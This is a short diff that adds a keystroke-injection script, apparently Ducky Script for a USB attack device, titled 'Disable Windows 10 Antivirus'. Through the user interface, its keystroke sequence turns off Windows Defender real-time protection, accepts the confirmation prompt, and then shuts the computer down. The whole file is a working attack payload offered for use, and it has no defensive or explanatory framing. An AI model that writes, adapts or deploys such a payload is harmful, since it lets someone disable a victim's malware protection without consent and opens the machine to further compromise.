@@ -1,0 +1,40 @@
+REM Title: Disable Windows 10 Antivirus
+REM Author: ZachQ
+REM Description: Disables antivirus and after that shuts down the computer
+REM Target: Windows 10 (User Interface)
+REM Version: 1.1
+
+
+DELAY 1000 
+GUI 
+DELAY 1000 
+STRING ant 
+DELAY 1000 
+ENTER 
+DELAY 2000 
+TAB 
+TAB 
+TAB 
+TAB 
+ENTER 
+DELAY 2000 
+SPACEBAR 
+DELAY 1000 
+LEFTARROW
+DELAY 800 
+ENTER 
+DELAY 2000 
+ALT F4
+DELAY 500
+GUI
+DELAY 500
+TAB
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 300
+DOWNARROW
+ENTER
